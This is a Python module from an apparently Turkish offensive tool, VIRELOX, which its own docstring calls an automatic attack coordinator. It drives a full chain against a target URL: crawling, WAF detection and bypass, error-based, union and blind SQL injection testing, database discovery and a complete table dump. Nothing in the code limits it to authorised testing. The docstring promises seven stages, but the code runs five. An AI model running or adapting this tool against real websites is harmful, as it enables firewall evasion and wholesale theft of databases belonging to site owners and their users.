"""
VIRELOX Ana Beyin — 7 Aşamalı Otomatik Saldırı Koordinatörü
Mozilla Public License 2.0 — AltayHR Developers
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modüller.virelox_http_client import VIRELOXHttpIstemci
from modüller.virelox_sql import SQLInjectionMotoru
from modüller.virelox_crawler import WebCrawler
from zeka_sistemi.waf_bypass_havuzu import WAFTespitMotoru
from zeka_sistemi.waf_bypass_gurubu import WAFBypassGrubuV2
from datetime import datetime
from typing import Dict, Optional


class AnaBeyinKoordinatoru:
    """
    7 Aşamalı Otomatik Pentest Akışı:
    1. Keşif (crawl)
    2. WAF tespiti
    3. WAF bypass hazırlama
    4. SQLi tespiti
    5. DB keşfi
    6. Tam dump
    7. Rapor
    """

    def __init__(self, url: str, param: str = None,
                 proxy: str = None, cookie: str = None,
                 verbose: bool = False):
        self.url     = url
        self.param   = param
        self.verbose = verbose
        self.http    = VIRELOXHttpIstemci(proxy=proxy)
        self.sql     = SQLInjectionMotoru(self.http, log_func=self._log)
        self.waf_bypass = WAFBypassGrubuV2(self.http, self._log)
        self.sonuclar: Dict = {
            "url": url, "param": param,
            "zaman": datetime.now().isoformat(),
            "asama_sonuclari": {},
            "dump": {},
        }

    def _log(self, mesaj: str):
        if self.verbose:
            print(f"[BEYIN] {mesaj}")

    def calistir(self) -> Dict:
        self._log("Ana Beyin başlatıldı")

        # AŞAMA 1: Keşif
        self._log("AŞAMA 1: URL keşfi")
        crawler = WebCrawler(self.http, max_sayfa=10, log_func=self._log)
        kresif = crawler.tara(self.url)
        self.sonuclar["asama_sonuclari"]["kesif"] = {
            "sayfa_sayisi": len(kresif.get("ziyaret_edilen", [])),
            "form_sayisi":  len(kresif.get("formlar", [])),
        }

        # Param otomatik
        if not self.param:
            from modüller.virelox_crawler import URLToplayici
            params = URLToplayici.parametreleri_cikart(self.url)
            self.param = list(params.keys())[0] if params else "id"
            self._log(f"Otomatik param: {self.param}")

        # AŞAMA 2: WAF tespiti
        self._log("AŞAMA 2: WAF tespiti")
        waf_sonuc = self.waf_bypass.waf_tespit_ve_bypass_hazirla(self.url)
        self.sonuclar["asama_sonuclari"]["waf"] = waf_sonuc

        # AŞAMA 3: SQLi tespiti
        self._log("AŞAMA 3: SQL injection tespiti")
        ht = self.sql.hata_tabanli_test(self.url, self.param)
        ut = self.sql.union_tabanli_test(self.url, self.param)
        bt = self.sql.boolean_blind_test(self.url, self.param)
        acik = ht["basarili"] or ut["basarili"] or bt["basarili"]
        self.sonuclar["asama_sonuclari"]["sqli"] = {
            "acik": acik, "hata": ht, "union": ut, "boolean": bt,
        }

        if not acik:
            self._log("SQL injection açığı bulunamadı")
            return self.sonuclar

        # AŞAMA 4: DB keşfi
        self._log("AŞAMA 4: Veritabanı keşfi")
        db_adi = self.sql.mevcut_veritabani_al(self.url, self.param)
        self.sonuclar["asama_sonuclari"]["db_kresif"] = {"db": db_adi}

        # AŞAMA 5: Tam dump
        self._log("AŞAMA 5: Tam dump")
        dump = self.sql.tam_veritabani_dump(self.url, self.param, db_adi)
        self.sonuclar["dump"] = dump

        self._log(f"Tamamlandı — {len(dump.get('tablolar',{}))} tablo dump edildi")
        return self.sonuclar
